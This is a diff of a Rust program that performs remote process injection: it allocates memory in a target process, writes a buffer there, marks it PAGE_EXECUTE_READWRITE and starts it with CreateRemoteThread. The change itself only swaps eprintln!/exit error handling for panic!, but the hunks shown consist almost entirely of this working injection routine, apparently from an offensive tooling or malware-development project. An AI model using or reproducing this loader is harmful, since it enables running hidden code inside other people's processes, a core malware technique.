@@ -77,16 +77,14 @@ fn main() {
         );
 
         if address.is_null() {
-            eprintln!("[!] Failed to Allocate Memory in Target Process.");
             CloseHandle(h_process);
-            exit(-1)
+            panic!("[!] Failed to Allocate Memory in Target Process.");
         }
 
         println!("[i] Writing to memory");
         WriteProcessMemory(h_process, address, buf.as_ptr() as _, buf.len(), None).unwrap_or_else(|e| {
-            eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
             CloseHandle(h_process);
-            exit(-1);
+            panic!("[!] WriteProcessMemory Failed With Error: {}", e);
         });
 
         let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
@@ -97,9 +95,8 @@ fn main() {
             PAGE_EXECUTE_READWRITE,
             &mut oldprotect,
         ).unwrap_or_else(|e| {
-            eprintln!("[!] VirtualProtectEx Failed With Error: {}", e);
             CloseHandle(h_process);
-            exit(-1);
+            panic!("[!] VirtualProtectEx Failed With Error: {}", e);
         });
 
         println!("[+] Creating a Remote Thread");
@@ -112,9 +109,8 @@ fn main() {
             0,
             None,
         ).unwrap_or_else(|e| {
-            eprintln!("[!] CreateRemoteThread Failed With Error: {}", e);
             CloseHandle(h_process);
-            exit(-1);
+            panic!("[!] CreateRemoteThread Failed With Error: {}", e);
         });
 
         println!("[+] Executed!!");
